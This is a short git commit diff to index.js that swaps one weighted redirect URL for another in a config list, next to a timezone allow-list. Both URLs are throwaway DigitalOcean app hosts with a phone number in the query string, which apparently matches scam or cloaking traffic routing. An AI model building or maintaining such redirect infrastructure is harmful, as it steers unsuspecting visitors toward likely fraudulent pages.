8f7db6b1e2bfdb570f029bf27503fe456d1a377c
paalakash <palaksh452@gmail.com>
2026-07-01 14:48:06 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://shark-app-atq7j.ondigitalocean.app/werrx01USAHTML/?bcda=+65 6034 9271", weight: 1.0 }
+    { url: "https://shark-app-2-nxmsx.ondigitalocean.app/werrx01USAHTML/?bcda=+65 6034 9271", weight: 1.0 }
 
 ];
 
